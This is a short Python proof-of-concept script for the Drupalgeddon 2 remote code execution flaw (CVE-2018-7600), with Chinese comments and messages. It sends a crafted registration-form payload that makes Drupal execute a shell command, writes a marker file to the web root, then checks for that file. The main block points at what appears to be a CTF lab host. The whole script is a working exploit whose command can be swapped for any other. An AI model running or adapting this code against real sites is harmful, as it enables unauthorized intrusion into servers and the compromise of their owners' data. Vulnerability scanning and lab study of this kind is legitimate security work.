#!/usr/bin/env python3
# coding:utf-8
import requests
import sys
def poc(url, timeout=10):
    try:
        target = url
        commands = 'echo "test:)" | tee index1.txt'   # index1.txt文件
        url = target + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax'
        payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': '{}'.format(commands)}
        requests.post(url=url, data=payload, timeout=timeout)
        index1_url = target + '/index1.txt'
        res = requests.get(url=index1_url, timeout=timeout)
        if 'test:)' in res.text and res.status_code == 200:
            print('[+] [{}] 存在Drupal geddon 2 远程代码执行漏洞(CVE-2018-7600)'.format(target))
            return True, 'Drupal CVE-2018-7600: 存在漏洞'
        else:
            print('[-] [{}] 不存在Drupal geddon 2 远程代码执行漏洞(CVE-2018-7600)'.format(target))
            return False, 'Drupal CVE-2018-7600: 安全'
    except Exception as e:
        return False, f'Drupal CVE-2018-7600: 扫描失败 - {str(e)}'


if __name__ == "__main__":
    url = "http://node3.buuoj.cn:26848/"
    poc(url)